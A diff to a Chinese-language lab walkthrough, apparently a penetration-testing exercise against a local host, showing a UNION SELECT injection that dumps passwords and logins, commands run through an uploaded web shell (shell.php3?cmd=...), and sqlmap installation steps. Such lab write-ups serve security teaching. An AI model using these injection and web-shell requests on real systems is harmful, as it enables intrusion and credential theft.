@@ -503,6 +503,7 @@ http://192.168.55.3/cat.php?id=1 UNION SELECT 1,concat(password,'>',id,'>',login
 返回的信息：
 
 ```
+No PHP!!
 
 ```
 
@@ -524,7 +525,7 @@ http://192.168.55.3/admin/uploads/shell.php3
 ​	简单测试：
 
 ```
-
+http://192.168.55.3/admin/uploads/shell.php3?cmd=ls -a
 ```
 
 ​	![ls-a](image/ls-a.jpg)
@@ -543,11 +544,8 @@ http://192.168.55.3/admin/uploads/shell.php3?cmd=php%20-i
 
 #### Step 2 : sqlmap自动注入
 
-(1) 
-
-[sqlmap]: https://github.com/sqlmapproject/sqlmap
-
- 安装（Kali Linux 环境）：
+[sqlmap]: https://github.com/sqlmapproject/sqlmap 
+安装（Kali Linux 环境）：
 
 ```
 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
